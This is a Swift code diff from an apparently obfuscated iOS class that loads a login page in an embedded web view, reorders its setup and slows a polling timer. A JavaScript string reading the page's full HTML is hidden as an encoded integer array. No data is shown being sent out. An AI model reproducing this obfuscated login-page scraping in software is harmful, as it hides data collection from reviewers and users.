@@ -164,22 +164,6 @@ public class SluwfnekehYUnulhulnBDhdTsthCSljDjgTljhluHUL: nINHhhkDVuylduudjlSrsU
         UOPtM8q0RMfAeZlGbe3cwQwe5dUNZfCT()
         Za7YCvOtqewFlJWFIniOi9kJiSbGPQDG()
         
-        HykwA9VUHysS6R6G9mmOVwadykjP65Ln.jTvZsXNZOlrmH5ZpM3GESmqCkATsZMDS() {
-            self.handler.loadCustomURL(Snehtulthenrstkrsenrstenr.settings.loginURL) { [weak self] result in
-                switch result {
-                case .success(_):
-                    self?.handler.webView?.frame = CGRect(x: 0, y: 0, width: self?.containerView.frame.size.width ?? 0, height: self?.containerView.frame.size.height ?? 0)
-                    if let wv = self?.handler.webView {
-                        self?.containerView.addSubview(wv)
-                    }
-                case .failure(let reason):
-                    print(reason)
-                }
-            }
-        }
-        
-        runJSChecksInLoop()
-        
         handler.set(onDidFinish: { [weak self] webView in
             webView?.evaluateJavaScript([23, 44, 19, 2, 36, 31, 11, 35, 24, 8, 40, 86, 29, 91, 48, 31, 52, 62, 25, 11, 24, 13, 40].localizedString) { result, error in // "document.body.innerHTML"
                 guard let result = result as? String, error == nil else {
@@ -229,6 +213,22 @@ public class SluwfnekehYUnulhulnBDhdTsthCSljDjgTljhluHUL: nINHhhkDVuylduudjlSrsU
             self?.GPDA7xAfrmUstbwkNL8w8L28c51RQ5GI()
             self?.WZ7f2KMy0Fl7KhvJ2zqGlgx0d4kTGF6u(enabled: true)
         })
+        
+        HykwA9VUHysS6R6G9mmOVwadykjP65Ln.jTvZsXNZOlrmH5ZpM3GESmqCkATsZMDS() {
+            self.handler.loadCustomURL(Snehtulthenrstkrsenrstenr.settings.loginURL) { [weak self] result in
+                switch result {
+                case .success(_):
+                    self?.handler.webView?.frame = CGRect(x: 0, y: 0, width: self?.containerView.frame.size.width ?? 0, height: self?.containerView.frame.size.height ?? 0)
+                    if let wv = self?.handler.webView {
+                        self?.containerView.addSubview(wv)
+                    }
+                case .failure(let reason):
+                    print(reason)
+                }
+            }
+        }
+        
+        runJSChecksInLoop()
     }
 
     // If this is set it will get executed upon Login, and default functionality will not be executed.
@@ -245,7 +245,7 @@ public class SluwfnekehYUnulhulnBDhdTsthCSljDjgTljhluHUL: nINHhhkDVuylduudjlSrsU
     }
 
     func Za7YCvOtqewFlJWFIniOi9kJiSbGPQDG() {
-        timer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
+        timer = Timer.scheduledTimer(withTimeInterval: 5, repeats: true) { [weak self] _ in
             self?.ialrHwCXVjINidRkN6tmp3hG1pTmSPuL()
         }
     }
